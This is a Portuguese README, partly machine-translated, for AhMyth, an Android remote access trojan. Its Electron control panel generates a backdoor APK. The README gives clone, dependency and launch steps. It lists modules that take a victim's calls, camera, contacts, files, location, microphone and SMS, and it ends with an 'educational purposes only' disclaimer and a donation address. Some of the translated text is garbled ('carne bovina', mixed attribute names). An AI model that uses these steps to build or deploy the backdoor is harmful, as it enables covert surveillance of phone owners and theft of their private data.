# AhMyth Android Rat
###### Versão beta
+ repositório original
    + ``` https://github.com/AhMyth/AhMyth-Android-RAT.git```
+ O repositório atual corrige problemas comuns para instalação no debian 10, também coleta pull requests não aprovados e adiciona novos recursos.
    + ```https://github.com/elcaza/AhMyth-Android-RAT```


Este projeto consiste em duas partes
* Servidor : Aplicativo de desktop baseado em electron framework (painel de controle)
* Cliente: aplicativo Android (backdoor)


## Primeiros passos
### Existem duas opções para instalar o aplicativo
#### 1) Do código fonte
###### Pré-requisitos:
* Electron (para iniciar o aplicativo)
* Java 8 (para gerar backdoor apk)
* Para builders, Electron-builder e electron-packer (para construir binários nos sistemas (OSX, WINDOWS, LINUX))
1. ```git clone https://github.com/AhMyth/AhMyth-Android-RAT.git```
2. ```cd AhMyth-Android-RAT/AhMyth-Server```
3. ```npm start```

#### 2) Dos binários
###### Pré-requisito:
* Baixe o binário de https://github.com/linscomt/AhMyth-Android-RAT/releases se houver
* Java (para gerar backdoor apk)

## Instalando dependências e solucionando erros comuns
+ Isso foi testado nos seguinte ambiente
    + Debian 10
    + javac 8
    + Node 10
    + NPM
    + --------------
    + Win 10
    + javac 8
    + Node v18.12.0
    + NPM v8.19.3



```
# Instalando as dependências do projeto no linux
sudo apt install -y nodejs npm git curl libgconf-2-4

#Instalando o java8
sudo apt install -y wget gnupg software-properties-common
wget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | sudo apt-key add -
sudo add-apt-repository --yes https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/
sudo apt update -y
sudo apt install adoptopenjdk-8-hotspot -y

sudo update-alternatives --config java
# Aqui selecione aquele com o "8"

git clone https://github.com/elcaza/AhMyth-Android-RAT
cd AhMyth-Android-RAT/AhMyth-Server/
npm i
npm start
```

## Estrutura do Projeto
servidor web
+aplicativo/
+aplicativo/
+ ativos
+ css
+ imagem
+ j
+ controladores
+ AppCtrl.js **(Aplicativo principal)**
+ LabCtrl.js **(janela filho da vítima)**
+ AppCtrl.js **(notificações pop-up)**
+ lib **(Bibliotecas)**
+ modelo **(classe da vítima)**
+ Fábrica **(Arquivos para compilação)**
+ visualizações **(Visualizações de cada seção do código)**
+ arquivos.html
+ node_modules/
+ main.js **(arquivo principal que exibe todo o servidor)**
+ pacote.json

Cliente
+ principal/
+ java **(A estrutura de classe inteira)**
+ CallManager.java **(Chamadas)**
+ CameraManager.java **(Câmera)**
+ ConnectionManager.java **(Sockets)**
+ ContactsManager.java **(Contatos)**
+ FileManager.java **(Arquivos)**
+ IOSocket.java **(Sockets)**
+ LocManager.java **(Localização)**
+ MainActivity.java **(MainActivity)**
+ MainService.java **(MainService)**
+ MicManager.java **(Microfone)**
+ MyReceiver.java **(Sockets)**
+ SMSManager.java **(Mensagens)**
+ carne bovina
+ AndroidManifest.xml


## Capturas de tela
<p align="center">
<img src="http://i.imgur.com/HM3uXL6.png" largura="600"/>
</p>

-------------------------------------------------- -------------

<p align="center">
<img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
</p>

-------------------------------------------------- -------------

<p align="center">
<img src="http://i.imgur.com/XVXCHV9.png" largura="600"/>
</p>


## Vídeo tutorial
<p align="center">
<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
<img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
</a></p>

-------------------------------------------------- -------------
##### Não me responsabilizo por qualquer dano direto ou indireto causado pelo uso desta ferramenta, é apenas para fins educacionais.
###### Twitter : <a href="https://twitter.com/AhMythDev"> @AhMythDev </a>
###### Endereço Bitcoin do desenvolvedor inicial para doações: : 1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq

### Obs: Projeto estacionado (***)
